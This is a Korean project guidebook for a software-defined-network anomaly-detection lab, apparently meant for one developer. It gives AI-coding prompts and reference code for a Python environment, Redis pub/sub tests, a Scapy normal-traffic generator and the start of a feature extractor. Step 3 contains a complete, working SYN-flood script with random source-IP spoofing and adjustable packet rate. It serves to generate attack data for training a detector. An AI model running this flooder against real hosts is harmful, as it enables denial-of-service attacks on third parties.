# 🛡️ [개발자 B] 1주차 바이브 코딩 실전 가이드북 (검증 & 보완 완료판)
## AI & 보안 파이프라인 기반 확립 (Scapy 트래픽 생성기 + 피처 엔지니어링 + Redis 연동)

> **대상:** 개발자 B (AI & 보안 파이프라인 엔지니어)  
> **개발 방식:** 바이브 코딩 (AI 코딩 어시스턴트 프롬프트 중심 개발)  
> **1주차 마일스톤:** Python 3.10 가상환경 구축, Scapy 기반 정상/공격 트래픽 생성기 구현, Checksum Offload & IP Spoofing 방어 검증, 5대 표준 SDN 피처 계산기 및 데이터 로거 작성, Redis IPC Pub/Sub 통신 규격 검증  
> **참조 문서:** `roadmap_v2.md`

---

## 📋 목차
1. [1주차 개발 목표 및 핵심 아키텍처](#1-1주차-개발-목표-및-핵심-아키텍처)
2. [개발자 B 디렉토리 구조 및 작업 위치 안내](#2-개발자-b-디렉토리-구조-및-작업-위치-안내)
3. [바이브 코딩 5단계 워크플로우](#3-바이브-코딩-5단계-워크플로우)
   - [Step 1: Python 3.10 가상환경(`venv-ai`) 구축 및 Redis 7.2 연결 검증](#step-1-python-310-가상환경venv-ai-구축-및-redis-72-연결-검증)
   - [Step 2: Scapy 기반 정상 트래픽 생성기 구현 (`traffic/traffic_normal.py`)](#step-2-scapy-기반-정상-트래픽-생성기-구현-traffictraffic_normalpy)
   - [Step 3: Scapy 기반 랜덤 IP 변조 SYN Flooding 공격기 구현 (`traffic/traffic_attack.py`)](#step-3-scapy-기반-랜덤-ip-변조-syn-flooding-공격기-구현-traffictraffic_attackpy)
   - [Step 4: 5대 SDN 표준 파생 피처 계산 모듈 및 로거 구현 (`pipeline/feature_extractor.py`)](#step-4-5대-sdn-표준-파생-피처-계산-모듈-및-로거-구현-pipelinefeature_extractorpy)
   - [Step 5: 1주차 E2E 검증 (독립 단위 테스트 + Mininet 호스트 연동 + 자동화 검증)](#step-5-1주차-e2e-검증-독립-단위-테스트--mininet-호스트-연동--자동화-검증)
4. [개발자 B 전용 치명적 함정 & 디버깅 체크리스트](#4-개발자-b-전용-치명적-함정--디버깅-체크리스트)
5. [팀원(개발자 A, C) 인계 사항 및 1주차 완료 보고서 양식](#5-팀원개발자-a-c-인계-사항-및-1주차-완료-보고서-양식)

---

## 1. 1주차 개발 목표 및 핵심 아키텍처

### 1.1 1주차 핵심 임무
1. **Python 3.10 호스트 가상환경(`venv-ai`) 구축:** Ubuntu 22.04 LTS 네이티브 파이썬 3.10 기반으로 `requirements-ai.txt`(Scikit-learn 1.3, Scapy 2.5, Pandas 2.1, NumPy 1.24, Redis 5.0) 고정 버전 환경 구축.
2. **Scapy 정상 트래픽 생성기 제작 (`traffic_normal.py`):** `h_legit`(10.0.0.1) 단말에서 `h_server`(10.0.0.4)를 향해 HTTP GET 시뮬레이션, 대용량 파일 전송, 주기적 ICMP 핑 등을 가변 간격(Poisson/Random delay)으로 발송하여 현실적인 정상 네트워크 패턴 모사.
3. **Scapy 랜덤 IP 스푸핑 SYN Flooding 공격기 제작 (`traffic_attack.py`):** `h_attacker`(10.0.0.2) 단말에서 임의의 변조 IP를 소스로 주입하여 초당 1,000~5,000개의 SYN 패킷을 폭주시키는 공격 스크립트 작성. **Linux 커널의 Checksum Offload 누락 방지 코드(`del pkt[IP].chksum`, `del pkt[TCP].chksum`) 필수 적용**.
4. **SDN 5대 표준 파생 피처 파이프라인 설계 (`feature_extractor.py`):** Ryu의 누적 카운터(`rx_packets`, `rx_bytes`, `duration_sec`)로부터 $\Delta \text{PPS}$, $\Delta \text{BPS}$, $\text{BPP}$(Bytes Per Packet) 등 핵심 판별 지표를 실시간 계산하는 엔진 구현 및 2주차 머신러닝 학습을 위한 CSV 데이터 로거 구축.
5. **Redis IPC 통신 프로토콜 합의 및 검증:** 개발자 A(Ryu), 개발자 C(FastAPI)와 합의된 Redis 채널(`sdn:stats:port`, `sdn:anomaly:alert`, `sdn:control:command`) 데이터 규격을 검증하는 테스트 코드 작성.

### 1.2 1주차 AI/보안 데이터 파이프라인 블록도
```
+------------------------------------------------------------------------------------+
|                         [Data Plane: Mininet 가상 호스트군]                         |
|                                                                                    |
|   [H_legit: 10.0.0.1]                           [H_attacker: 10.0.0.2]             |
|   traffic/traffic_normal.py                     traffic/traffic_attack.py          |
|   - HTTP GET / Large Payload / Ping             - Random Spoofed IP SYN Flooding   |
|   - BPP: 500 ~ 1400 Bytes (대형)                - BPP: 54 ~ 74 Bytes (소형 고정)   |
|   - PPS: 10 ~ 100 PPS (안정적)                   - PPS: 1,000 ~ 10,000 PPS (폭증)   |
|            │ (정상 패킷)                                 │ (공격 패킷)              |
+------------┼─────────────────────────────────────────────┼-------------------------+
             ▼                                             ▼
+------------------------------------------------------------------------------------+
|                          [Open vSwitch: S1 Ingress Switch]                         |
|   Port 1: H_legit (Access)                      Port 2: H_attacker (Access)        |
+------------------------------------------------------------------------------------+
                                           │ (OFPPortStatsRequest / Reply)
                                           ▼
+------------------------------------------------------------------------------------+
|                       [Control Plane: Ryu 4.34 Controller]                         |
|   - 2초 주기로 포트 통계 수집                                                      |
|   - Redis Channel: sdn:stats:port 에 JSON 통계 브로드캐스팅                         |
+------------------------------------------------------------------------------------+
                                           │
                                           ▼ Redis Pub/Sub (Port 6379)
+------------------------------------------------------------------------------------+
|                   [Layer 2-B: 개발자 B 작업 영역 (Python 3.10 venv-ai)]              |
|                                                                                    |
|   [pipeline/feature_extractor.py]                                                  |
|   1. 이전 틱 vs 현재 틱 차분 계산: ΔPPS, ΔBPS, BPP                                 |
|   2. 특징 분석:                                                                    |
|      - 정상 구간: 높은 BPP, 낮은 PPS                                               |
|      - 공격 구간: 급격히 낮은 BPP (< 80 bytes), 폭발적 PPS (> 2,000)                |
|   3. 2주차 Isolation Forest 사전 학습용 CSV 로깅 (data/traffic_features.csv)       |
|   4. 이상 탐지 모의 판정 및 sdn:anomaly:alert 발행 검증                            |
+------------------------------------------------------------------------------------+
```

---

## 2. 개발자 B 디렉토리 구조 및 작업 위치 안내

모든 개발자 B의 소스 코드와 가상환경, 테스트 데이터는 **`textgg/Developer/B/`** 디렉토리 하위에서 독립적으로 관리됩니다.

```
textgg/
├── Developer/
│   ├── A/                                         # 개발자 A (SDN & Mininet 인프라)
│   ├── B/                                         # [개발자 B 전용 작업 공간]
│   │   ├── Developer_B_Week1_VibeCoding_Guide.md  # 본 실전 가이드북
│   │   ├── requirements-ai.txt                    # Python 3.10 AI 의존성 명세서
│   │   ├── venv-ai/                               # (Step 1 생성) Python 3.10 가상환경
│   │   ├── traffic/
│   │   │   ├── __init__.py
│   │   │   ├── traffic_normal.py                  # 정상 트래픽 발생기 (HTTP/ICMP 모사)
│   │   │   └── traffic_attack.py                  # IP 스푸핑 SYN Flooding 공격 발생기
│   │   ├── pipeline/
│   │   │   ├── __init__.py
│   │   │   └── feature_extractor.py               # 5대 표준 SDN 피처 계산기 & CSV 로거
│   │   ├── scripts/
│   │   │   ├── setup_env.sh                       # venv-ai 셋업 및 패키지 설치 자동화
│   │   │   ├── test_redis_pubsub.py               # Redis Pub/Sub 통신 프로토콜 검증
│   │   │   └── verify_week1_b.sh                  # 1주차 전체 E2E 자동 검증 스크립트
│   │   └── data/                                  # 2주차 AI 모델 학습용 데이터셋 저장소
│   │       └── .gitkeep
│   └── C/                                         # 개발자 C (FastAPI & React 관제탑)
└── roadmap_v2.md         # 프로젝트 전체 로드맵
```

> 💡 **바이브 코딩 팁:** 터미널에서 작업할 때는 항상 `cd /home/tlgus/programming/textgg/Developer/B`로 이동한 후 가상환경(`source venv-ai/bin/activate`)을 켜고 작업하세요.

---

## 3. 바이브 코딩 5단계 워크플로우

각 단계마다 **[🎯 작업 목표]**, **[💬 AI 프롬프트]**, **[🛠️ 실행 및 검증 명령어]**, **[📄 완성 참조 구현 코드]**가 완비되어 있습니다. 프롬프트를 복사하여 AI 어시스턴트에 입력하거나, 제공된 완전한 검증 코드를 즉시 생성하여 실행하세요.

---

### Step 1: Python 3.10 가상환경(`venv-ai`) 구축 및 Redis 7.2 연결 검증

#### 🎯 작업 목표
Ubuntu 22.04 LTS 호스트의 시스템 파이썬(3.10.12)을 기반으로 독립된 가상환경 `venv-ai`를 구성하고, `requirements-ai.txt`의 패키지들을 설치합니다. 또한 개발자 A가 띄운 Redis 컨테이너(`127.0.0.1:6379`)와 정상적으로 PING/PONG 및 Pub/Sub 통신이 이루어지는지 검증합니다.

#### 💬 AI 프롬프트 (Step 1)
```text
Ubuntu 22.04 LTS 환경에서 동작하는 AI & 보안 파이프라인 개발용 가상환경 셋업 스크립트 `scripts/setup_env.sh`와
의존성 파일 `requirements-ai.txt`, 그리고 Redis 연동 테스트 스크립트 `scripts/test_redis_pubsub.py`를 작성해줘.

[requirements-ai.txt 명세]
- scikit-learn==1.3.2
- scapy==2.5.0
- pandas==2.1.4
- numpy==1.24.3
- redis==5.0.1
- joblib==1.3.2

[scripts/setup_env.sh 요구사항]
1. 시스템 python3 및 python3-venv, python3-pip 설치 확인
2. `venv-ai` 디렉토리 생성 및 pip 최신화
3. `requirements-ai.txt` 고정 버전 설치
4. scapy 구동을 위해 필요한 호스트 libpcap/tcpdump 확인 및 설치 안내
5. 설치 완료 후 scapy, redis, sklearn 버전 출력 검증

[scripts/test_redis_pubsub.py 요구사항]
1. 127.0.0.1:6379 연결 확인 (Ping)
2. `sdn:stats:port` 채널로 더미 포트 통계 JSON Publish
3. `sdn:anomaly:alert` 채널로 더미 이상 탐지 경보 JSON Publish
4. JSON 직렬화 시 int64/float64 타입 에러가 발생하지 않도록 안전한 변환 함수 적용
```

#### 📄 완성 참조 파일 명세

##### 1) `B/requirements-ai.txt`
```text
scikit-learn==1.3.2
scapy==2.5.0
pandas==2.1.4
numpy==1.24.3
redis==5.0.1
joblib==1.3.2
```

##### 2) `B/scripts/setup_env.sh`
```bash
#!/usr/bin/env bash
set -e

echo "=== [개발자 B] AI & 보안 파이프라인 환경 구축 시작 ==="
cd "$(dirname "$0")/.."

# 1. 시스템 필수 패키지 설치
echo "[1/4] 시스템 필수 패키지 확인 및 설치..."
sudo apt-get update -qq
sudo apt-get install -y -qq python3 python3-venv python3-pip python3-dev tcpdump libpcap-dev

# 2. Python 3.10 가상환경 생성
echo "[2/4] Python 3.10 venv-ai 생성..."
if [ ! -d "venv-ai" ]; then
    python3 -m venv venv-ai
    echo "  -> venv-ai 생성 완료"
else
    echo "  -> venv-ai 가 이미 존재합니다. 건너뜁니다."
fi

# 3. 의존성 설치
echo "[3/4] Python 의존성 설치 (requirements-ai.txt)..."
source venv-ai/bin/activate
pip install --upgrade pip setuptools wheel
pip install -r requirements-ai.txt

# 4. 설치 검증
echo "[4/4] 라이브러리 버전 확인..."
python3 -c "
import scapy, redis, sklearn, pandas, numpy
print(f'  - Scapy: {scapy.__version__}')
print(f'  - Redis-py: {redis.__version__}')
print(f'  - Scikit-learn: {sklearn.__version__}')
print(f'  - Pandas: {pandas.__version__}')
print(f'  - NumPy: {numpy.__version__}')
"
mkdir -p traffic pipeline scripts data

echo "=== [성공] 개발자 B 가상환경 셋업 완료! ==="
echo "실행 방법: source venv-ai/bin/activate"
```

##### 3) `B/scripts/test_redis_pubsub.py`
```python
#!/usr/bin/env python3
"""Redis Pub/Sub 통신 규격 사전 검증 스크립트"""
import json
import time
import redis

REDIS_HOST = "127.0.0.1"
REDIS_PORT = 6379

def main():
    print(f"[*] Redis 서버 연결 시도: {REDIS_HOST}:{REDIS_PORT}...")
    try:
        r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=0, decode_responses=True)
        r.ping()
        print("[+] Redis 서버 PING 응답 성공!")
    except redis.ConnectionError:
        print("[-] [에러] Redis 서버에 연결할 수 없습니다. Docker 컨테이너(sdn-redis) 가 켜져 있는지 확인하세요.")
        print("    힌트: cd ../A && docker compose up -d redis-broker")
        return False

    # 1. 포트 통계 더미 데이터 발행 (sdn:stats:port)
    dummy_stats = {
        "timestamp": time.time(),
        "dpid": "0000000000000001",
        "port_no": 1,
        "rx_packets": 14200,
        "tx_packets": 14150,
        "rx_bytes": 10245000,
        "tx_bytes": 10210000,
        "rx_errors": 0,
        "duration_sec": 45
    }
    r.publish("sdn:stats:port", json.dumps(dummy_stats))
    print(f"[+] [sdn:stats:port] 발행 완료: rx_packets={dummy_stats['rx_packets']}")

    # 2. 이상 탐지 경보 더미 데이터 발행 (sdn:anomaly:alert)
    dummy_alert = {
        "timestamp": time.time(),
        "target_dpid": "0000000000000001",
        "suspect_port": 2,
        "anomaly_score": -0.85,
        "threat_type": "SYN_FLOOD_SPOOFING",
        "metrics": {
            "pps": 4500,
            "bps": 2800000,
            "bpp": 77.7
        },
        "action_required": "IN_PORT_DROP"
    }
    r.publish("sdn:anomaly:alert", json.dumps(dummy_alert))
    print(f"[+] [sdn:anomaly:alert] 발행 완료: threat={dummy_alert['threat_type']}")

    print("[*] Redis IPC 데이터 계약(Data Contract) 검증 완벽 통과!")
    return True

if __name__ == "__main__":
    import sys
    if not main():
        sys.exit(1)
```

#### 🛠️ 실행 및 검증 명령어
```bash
cd /home/tlgus/programming/textgg/Developer/B
chmod +x scripts/setup_env.sh
./scripts/setup_env.sh

# 가상환경 활성화
source venv-ai/bin/activate

# Redis 연결 테스트 (A 디렉토리의 sdn-redis 컨테이너가 실행된 상태여야 함)
python3 scripts/test_redis_pubsub.py
```

> **성공 기준:** 라이브러리 버전이 정상 출력되고, `Redis 서버 PING 응답 성공!` 및 채널 발행 성공 메시지가 출력되면 완료.

---

### Step 2: Scapy 기반 정상 트래픽 생성기 구현 (`traffic/traffic_normal.py`)

#### 🎯 작업 목표
정상 단말인 `h_legit`(10.0.0.1)에서 대상 서버 `h_server`(10.0.0.4)를 향해 현실적인 웹 통신(HTTP GET 및 응답 모사), ICMP Ping, 파일 전송 패킷을 전송하는 스크립트를 구현합니다.  
**[핵심 기술 요구]** 
1. 패킷 크기를 500~1400 Bytes로 다양화하여 평균 **BPP(Bytes Per Packet)가 500 이상**을 유지하도록 설계.
2. 초당 20~50 패킷 수준의 적절한 전송률(PPS)을 유지하고, 전송 간격에 지터(Random Jitter)를 주어 자연스러운 트래픽 곡선 형성.
3. Linux 가상 인터페이스 전송 시 체크섬 폐기 방지(`del pkt[IP].chksum`).

#### 💬 AI 프롬프트 (Step 2)
```text
Python 3.10 및 Scapy 2.5를 사용하여 SDN 다이아몬드 토폴로지용 정상 트래픽 생성기 `traffic/traffic_normal.py`를 작성해줘.

[세부 기능 명세]
1. 송수신 주소 설정:
   - Source IP: 기본값 10.0.0.1 (h_legit)
   - Target IP: 기본값 10.0.0.4 (h_server)
   - CLI 인자로 --src, --dst, --pps, --duration, --interface 설정 가능
2. 다양한 프로토콜 모사:
   - 패턴 A (HTTP GET 요청 모사): TCP dport=80, 페이로드에 "GET /index.html HTTP/1.1\r\nHost: server...\r\n\r\n" 포함 (크기: 약 300~600 Bytes)
   - 패턴 B (대용량 파일 다운로드/데이터 전송 모사): TCP dport=80, 1200 Bytes의 무작위 데이터 페이로드 삽입 (크기: 약 1250 Bytes)
   - 패턴 C (ICMP Ping 통신): 일반적인 echo request (크기: 약 84 Bytes)
3. 특징 엔지니어링 고려:
   - 패턴 A, B, C를 4:5:1 비율로 무작위 발송하여 평균 BPP가 약 700~1100 Bytes가 되도록 구성할 것.
4. [안정성 방어 코드]
   - 매 패킷마다 del pkt[IP].chksum 및 del pkt[TCP].chksum 처리하여 체크섬 오류로 인한 수신측 폐기 방지.
   - Ctrl+C(SIGINT) 인터럽트 시 총 전송 패킷 수, 총 바이트 수, 평균 PPS, 평균 BPP 통계를 이쁘게 출력하고 안전 종료.
```

#### 📄 완성 참조 구현 코드 (`B/traffic/traffic_normal.py`)
```python
#!/usr/bin/env python3
"""
[개발자 B] Scapy 기반 정상 트래픽 생성기 (Normal Traffic Generator)
- 대상: H_legit (10.0.0.1) -> H_server (10.0.0.4)
- 목적: 다양한 크기의 정상 트래픽(HTTP GET, 대용량 파일, ICMP)을 전송하여 높은 BPP와 안정적 PPS 생성
"""
import argparse
import os
import random
import signal
import sys
import time
from scapy.all import IP, TCP, ICMP, Raw, send, conf

# 전송 통계 추적 변수
total_packets = 0
total_bytes = 0
start_time = 0

def signal_handler(sig, frame):
    """Ctrl+C 종료 시 통계 요약 출력"""
    elapsed = max(time.time() - start_time, 0.001)
    avg_pps = total_packets / elapsed
    avg_bpp = total_bytes / total_packets if total_packets > 0 else 0
    avg_kbps = (total_bytes * 8) / (elapsed * 1000)

    print("\n" + "=" * 55)
    print("        [정상 트래픽 전송 요약 보고서]")
    print("=" * 55)
    print(f" 총 전송 시간       : {elapsed:.2f} 초")
    print(f" 총 전송 패킷 수    : {total_packets:,} pkts")
    print(f" 총 전송 바이트     : {total_bytes:,} bytes ({total_bytes / (1024*1024):.2f} MB)")
    print(f" 평균 전송률 (PPS)  : {avg_pps:.2f} packets/sec")
    print(f" 평균 대역폭 (Kbps) : {avg_kbps:.2f} Kbps")
    print(f" 평균 패킷 크기(BPP): {avg_bpp:.2f} bytes/packet (정상 기준치: > 500)")
    print("=" * 55)
    sys.exit(0)

def generate_http_request(src_ip, dst_ip, src_port):
    """HTTP 요청 패킷 (크기 약 300~500 bytes)"""
    paths = ["/index.html", "/api/v1/status", "/images/logo.png", "/static/bundle.js"]
    payload = (
        f"GET {random.choice(paths)} HTTP/1.1\r\n"
        f"Host: {dst_ip}\r\n"
        f"User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=80, flags="PA") / Raw(load=payload)
    return pkt

def generate_large_payload(src_ip, dst_ip, src_port):
    """대용량 전송 모사 패킷 (크기 약 1200~1400 bytes)"""
    payload_size = random.randint(1000, 1350)
    payload = os.urandom(payload_size)
    pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=80, flags="A") / Raw(load=payload)
    return pkt

def generate_icmp_ping(src_ip, dst_ip):
    """일반 ICMP Ping 패킷 (크기 약 84 bytes)"""
    pkt = IP(src=src_ip, dst=dst_ip) / ICMP() / Raw(load=b"A" * 56)
    return pkt

def main():
    global total_packets, total_bytes, start_time
    parser = argparse.ArgumentParser(description="SDN Self-Defending Normal Traffic Generator")
    parser.add_argument("--src", default="10.0.0.1", help="출발지 IP (기본: 10.0.0.1 - h_legit)")
    parser.add_argument("--dst", "--target", dest="dst", default="10.0.0.4", help="목적지 IP (기본: 10.0.0.4 - h_server)")
    parser.add_argument("--pps", type=float, default=30.0, help="초당 전송 패킷 수 (기본: 30 pps)")
    parser.add_argument("--duration", type=int, default=0, help="전송 지속 시간(초, 0=무제한)")
    parser.add_argument("--interface", default=None, help="전송 인터페이스 (None=자동 라우팅)")
    args = parser.parse_args()

    # Scapy 상세 출력 끄기
    conf.verb = 0
    signal.signal(signal.SIGINT, signal_handler)

    print(f"[*] [H_legit] 정상 트래픽 생성 시작: {args.src} -> {args.dst}")
    print(f"[*] 설정: 목표 {args.pps} PPS | 예상 BPP: 600~1100 Bytes | 중단하려면 Ctrl+C 누르세요.")
    
    start_time = time.time()
    interval = 1.0 / max(args.pps, 1.0)
    src_port = random.randint(30000, 60000)

    while True:
        # 시간 제한 확인
        if args.duration > 0 and (time.time() - start_time) >= args.duration:
            signal_handler(None, None)

        # 40% HTTP GET, 50% Large Data, 10% Ping
        dice = random.random()
        if dice < 0.40:
            pkt = generate_http_request(args.src, args.dst, src_port)
        elif dice < 0.90:
            pkt = generate_large_payload(args.src, args.dst, src_port)
        else:
            pkt = generate_icmp_ping(args.src, args.dst)

        # [필수] 체크섬 재계산 유도 (Checksum Offload 버그 방어)
        if IP in pkt:
            del pkt[IP].chksum
        if TCP in pkt:
            del pkt[TCP].chksum

        # 패킷 송신
        try:
            if args.interface:
                send(pkt, iface=args.interface, verbose=False)
            else:
                send(pkt, verbose=False)
            
            pkt_len = len(pkt)
            total_packets += 1
            total_bytes += pkt_len
        except Exception as e:
            print(f"[-] 송신 에러: {e}")
            time.sleep(1)

        # 약간의 무작위 지터를 추가한 주기 대기
        jitter = random.uniform(0.8, 1.2)
        time.sleep(interval * jitter)

        # 50패킷마다 1회 로그
        if total_packets % 50 == 0:
            cur_bpp = total_bytes / total_packets
            print(f"  [정상 전송 중] 누적 패킷: {total_packets} pkts | 누적 바이트: {total_bytes:,} B | 현재 평균 BPP: {cur_bpp:.1f} B")

if __name__ == "__main__":
    main()
```

---

### Step 3: Scapy 기반 랜덤 IP 변조 SYN Flooding 공격기 구현 (`traffic/traffic_attack.py`)

#### 🎯 작업 목표
공격 단말인 `h_attacker`(10.0.0.2)에서 대상 서버 `h_server`(10.0.0.4)를 향해 대량의 TCP SYN 패킷을 쏟아붓는 DoS/DDoS 공격 스크립트를 작성합니다.  
**[핵심 기술 요구]**
1. **랜덤 IP 스푸핑(IP Spoofing):** 발신지 IP를 임의의 가상 IP로 변조하여 단일 IP 차단 방어를 우회하고, 토폴로지상 In_port 기반 격리 기법의 필요성을 입증.
2. **초소형 고정 BPP 특성:** TCP SYN 패킷(페이로드 없음) 특성상 **BPP가 54~74 Bytes로 급감**하여 AI 모델이 정상 트래픽과 확실하게 분리할 수 있는 피처 시그니처를 제공.
3. **PPS 제어기 탑재:** Mininet 및 가상머신의 CPU 과부하를 막기 위해 `--pps` 옵션으로 패킷 발송 속도를 정밀하게 제어 (기본 1,000 PPS).
4. **리눅스 체크섬 오프로드 방어:** `del pkt[IP].chksum`, `del pkt[TCP].chksum` 코드 적용.

#### 💬 AI 프롬프트 (Step 3)
```text
Python 3.10 및 Scapy 2.5를 사용하여 SDN 다이아몬드 토폴로지용 고속 IP 변조 SYN Flooding 공격기 `traffic/traffic_attack.py`를 작성해줘.

[세부 기능 명세]
1. CLI 인자:
   - --target: 공격 대상 IP (기본값: 10.0.0.4 - h_server)
   - --port: 공격 대상 포트 (기본값: 80)
   - --pps: 초당 공격 패킷 수 (기본값: 1000 pps, 최대 10000)
   - --duration: 공격 지속 시간 (기본값: 15초, 0=무제한)
   - --spoof-mode: "random" (완전 무작위 IP) 또는 "subnet" (10.0.0.x 대역 내 무작위 IP)
2. 패킷 구조:
   - IP Layer: src=무작위 변조 IP, dst=target
   - TCP Layer: sport=RandShort(), dport=target_port, flags="S", seq=무작위 정수
   - [필수] 체크섬 재계산 유도: del pkt[IP].chksum, del pkt[TCP].chksum
3. 전송 최적화:
   - Scapy send(pkt, verbose=False)를 배치(Batch) 또는 타이머 루프로 전송하여 목표 PPS를 정밀하게 추종.
   - 단일 코어 100% 점유를 방지하기 위해 짧은 시간 단위 슬립(micro-sleep) 삽입.
4. 통계 및 종료 처리:
   - 시작 시 빨간색 경고 배너 출력.
   - 공격 종료 시 전송 시간, 전송 패킷 수, 실측 PPS, 평균 BPP (약 54~60 Bytes) 요약 출력.
```

#### 📄 완성 참조 구현 코드 (`B/traffic/traffic_attack.py`)
```python
#!/usr/bin/env python3
"""
[개발자 B] Scapy 기반 무작위 IP 스푸핑 SYN Flooding 공격기 (SYN Flood Attack Generator)
- 대상: H_attacker (10.0.0.2) -> H_server (10.0.0.4:80)
- 목적: 수천 개의 IP 변조 SYN 패킷을 폭주시켜 급격한 PPS 폭증과 BPP 급감 유발
"""
import argparse
import random
import signal
import sys
import time
from scapy.all import IP, TCP, RandShort, send, conf

total_attack_pkts = 0
total_attack_bytes = 0
start_time = 0

def signal_handler(sig, frame):
    """공격 중단 시 최종 보고서 출력"""
    elapsed = max(time.time() - start_time, 0.001)
    actual_pps = total_attack_pkts / elapsed
    actual_bpp = total_attack_bytes / total_attack_pkts if total_attack_pkts > 0 else 0
    mbps = (total_attack_bytes * 8) / (elapsed * 1000 * 1000)

    print("\n" + "=" * 55)
    print("       💥 [SYN Flooding 공격 종료 보고서] 💥")
    print("=" * 55)
    print(f" 공격 지속 시간     : {elapsed:.2f} 초")
    print(f" 전송된 공격 패킷 수: {total_attack_pkts:,} pkts")
    print(f" 전송된 총 바이트   : {total_attack_bytes:,} bytes")
    print(f" 실측 공격률 (PPS)  : {actual_pps:,.2f} packets/sec")
    print(f" 발생 트래픽 대역폭 : {mbps:.2f} Mbps")
    print(f" 공격 패킷 크기(BPP): {actual_bpp:.2f} bytes/packet (공격 기준치: < 80)")
    print("=" * 55)
    sys.exit(0)

def generate_spoofed_ip(mode="random"):
    """스푸핑 소스 IP 생성"""
    if mode == "subnet":
        # 10.0.0.10 ~ 10.0.0.250 사이 IP 스푸핑
        return f"10.0.0.{random.randint(10, 250)}"
    else:
        # 완전 무작위 공인/사설 IP 스푸핑 (1.x.x.x ~ 223.x.x.x)
        first_octet = random.choice([x for x in range(1, 224) if x != 127])
        return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

def main():
    global total_attack_pkts, total_attack_bytes, start_time
    parser = argparse.ArgumentParser(description="SDN Self-Defending SYN Flood Attack Generator")
    parser.add_argument("--target", "--dst", dest="target", default="10.0.0.4", help="공격 대상 IP (기본: 10.0.0.4 - h_server)")
    parser.add_argument("--port", type=int, default=80, help="공격 대상 포트 (기본: 80)")
    parser.add_argument("--pps", type=int, default=1000, help="목표 PPS (기본: 1000 pkts/sec)")
    parser.add_argument("--duration", type=int, default=15, help="공격 지속 시간(초, 기본: 15초, 0=무제한)")
    parser.add_argument("--spoof-mode", choices=["random", "subnet"], default="random", help="스푸핑 모드")
    parser.add_argument("--interface", default=None, help="전송 인터페이스")
    args = parser.parse_args()

    conf.verb = 0
    signal.signal(signal.SIGINT, signal_handler)

    print("\n" + "!" * 60)
    print(f" [경고] SYN Flooding 공격 발사 준비!")
    print(f"  - Target      : {args.target}:{args.port}")
    print(f"  - Target PPS  : {args.pps} pkts/sec")
    print(f"  - Duration    : {args.duration if args.duration > 0 else '무제한'} 초")
    print(f"  - Spoof Mode  : {args.spoof_mode}")
    print("!" * 60 + "\n")

    start_time = time.time()
    batch_size = max(1, args.pps // 50)  # 20ms마다 배치 전송
    batch_interval = batch_size / float(args.pps)

    while True:
        if args.duration > 0 and (time.time() - start_time) >= args.duration:
            signal_handler(None, None)

        batch_pkts = []
        batch_bytes = 0
        for _ in range(batch_size):
            spoofed_src = generate_spoofed_ip(args.spoof_mode)
            pkt = IP(src=spoofed_src, dst=args.target) / TCP(
                sport=RandShort(), dport=args.port, flags="S", seq=random.randint(10000, 90000)
            )
            # [필수] 체크섬 재계산 유도
            del pkt[IP].chksum
            del pkt[TCP].chksum
            batch_pkts.append(pkt)
            batch_bytes += len(pkt)

        # 배치 송신
        try:
            if args.interface:
                send(batch_pkts, iface=args.interface, verbose=False)
            else:
                send(batch_pkts, verbose=False)
            total_attack_pkts += batch_size
            total_attack_bytes += batch_bytes
        except Exception as e:
            print(f"[-] 송신 에러: {e}")
            time.sleep(0.5)

        # 로그 출력
        if total_attack_pkts % (batch_size * 25) == 0:
            elapsed = time.time() - start_time
            cur_pps = total_attack_pkts / max(elapsed, 0.001)
            print(f"  🔥 [공격 진행 중] 누적: {total_attack_pkts:,} pkts | 실측 속도: {cur_pps:,.0f} PPS | 소스 IP 예시: {spoofed_src}")

        time.sleep(batch_interval)

if __name__ == "__main__":
    main()
```

---

### Step 4: 5대 SDN 표준 파생 피처 계산 모듈 및 로거 구현 (`pipeline/feature_extractor.py`)

#### 🎯 작업 목표
Ryu 컨트롤러가 2초 주기로 수집하여 전송하는 포트 통계(`sdn:stats:port`)의 누적 카운터로부터, **이상 징후를 판별할 수 있는 핵심 5대 파생 피처**를 실시간으로 계산하는 모듈을 구현합니다. 또한 계산된 피처를 2주차 Isolation Forest 모델 훈련에 활용할 수 있도록 CSV 데이터셋(`data/traffic_features.csv`)으로 실시간 기록합니다.

#### 📐 5대 표준 파생 피처 공식
1. **$\Delta \text{PPS}$ (Packets Per Second):** $\frac{\text{rx\_packets}_{t} - \text{rx\_packets}_{t-1}}{\Delta t}$ (공격 시 수천 단위로 폭증)
2. **$\Delta \text{BPS}$ (Bits Per Second):** $\frac{(\text{rx\_bytes}_{t} - \text{rx\_bytes}_{t-1}) \times 8}{\Delta t}$
3. **$\text{BPP}$ (Bytes Per Packet):** $\frac{\text{rx\_bytes}_{t} - \text{rx\_bytes}_{t-1}}{\text{rx\_packets}_{t} - \text{rx\_packets}_{t-1}}$ (★ **가장 결정적인 피처**: 정상은 500~1400, SYN Flooding은 54~74)
4. **활성 패킷 증가율 ($\Delta \text{Ratio}$):** $\frac{\text{rx\_packets}_{t} - \text{rx\_packets}_{t-1}}{\text{tx\_packets}_{t} - \text{tx\_packets}_{t-1} + 1}$ (단방향 Flooding 시 비대칭 급증)
5. **에러율 ($\text{ErrRate}$):** $\frac{\text{rx\_errors}_{t} - \text{rx\_errors}_{t-1}}{\Delta t}$

#### 💬 AI 프롬프트 (Step 4)
```text
Ryu 컨트롤러의 포트 통계 누적 카운터를 받아 5대 핵심 파생 피처(Delta PPS, Delta BPS, BPP, Delta Ratio, ErrRate)를
계산하고, 이상 여부를 간이 판정하여 CSV로 저장하는 모듈 `pipeline/feature_extractor.py`를 작성해줘.

[세부 요구사항]
1. `TrafficFeatureExtractor` 클래스 구현:
   - 포트별(dpid, port_no) 직전 틱의 통계(이전 타임스탬프, rx_packets, rx_bytes, tx_packets)를 메모리에 유지
   - 신규 통계가 들어오면 차분(delta)을 구하여 5대 피처를 계산하는 `extract_features(stats_dict)` 메서드 구현
   - 0으로 나누기(ZeroDivisionError) 방어 코드 필수
2. [치명적 함정 방어: NumPy 직렬화 에러 해결]
   - 모든 피처 및 스코어는 float(), int() 기본 파이썬 타입으로 형변환하여 반환
